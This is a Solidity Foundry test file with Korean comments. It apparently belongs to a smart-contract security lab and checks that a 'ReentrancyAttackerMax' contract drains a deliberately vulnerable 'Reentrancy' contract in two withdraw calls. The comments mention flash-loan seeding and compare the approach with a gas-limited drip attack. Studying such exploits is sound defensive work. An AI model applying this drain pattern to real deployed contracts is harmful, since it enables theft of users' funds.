// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Reentrancy} from "../src/Reentrancy.sol";
import {ReentrancyAttackerMax} from "../src/ReentrancyAttackerMax.sol";

contract ReentrancyMaxTest is Test {
    Reentrancy reentrancy;
    address alice;
    address attackerEOA;

    function setUp() public {
        reentrancy = new Reentrancy();
        alice = makeAddr("alice");
        attackerEOA = makeAddr("attacker");
        vm.deal(alice, 10 ether);
        vm.deal(attackerEOA, 100 ether); // 시드(현실에선 flash loan)
    }

    /// @notice 피해자 잔액이 아무리 커도, 최대-금액 방식은 단 2번의 withdraw로 전액 탈취한다.
    function testDrainMax() public {
        uint256 victim = 5 ether;
        vm.prank(alice);
        reentrancy.donate{value: victim}(alice);

        // 공격자: 피해자 잔액(5)과 같은 시드 예치 → 1회 재진입으로 전액
        vm.prank(attackerEOA);
        ReentrancyAttackerMax atk = new ReentrancyAttackerMax(address(reentrancy));
        vm.prank(attackerEOA);
        atk.attack{value: victim}();

        assertEq(address(reentrancy).balance, 0, "contract not fully drained");
        assertEq(atk.calls(), 2, "should drain in exactly 2 withdraws");
        assertEq(address(atk).balance, victim * 2, "loot = own seed + victim funds");

        emit log_named_uint("withdraw calls", atk.calls());
        emit log_named_decimal_uint("loot (ether)", address(atk).balance, 18);
        emit log_named_decimal_uint("profit = victim funds (ether)", address(atk).balance - victim, 18);

        atk.collect();
    }

    /// @notice 피해자 잔액이 50 ETH로 커도 여전히 2번이면 끝난다(찔끔형은 가스로 ~270회에서 revert).
    function testDrainMaxLargePot() public {
        uint256 victim = 50 ether;
        vm.deal(alice, 60 ether);
        vm.prank(alice);
        reentrancy.donate{value: victim}(alice);

        vm.deal(attackerEOA, 60 ether);
        vm.prank(attackerEOA);
        ReentrancyAttackerMax atk = new ReentrancyAttackerMax(address(reentrancy));
        vm.prank(attackerEOA);
        atk.attack{value: victim}();

        assertEq(address(reentrancy).balance, 0);
        assertEq(atk.calls(), 2); // 깊이/가스 무관 — 잔액 크기와 호출 수가 분리됨
        assertEq(address(atk).balance, victim * 2);
    }
}
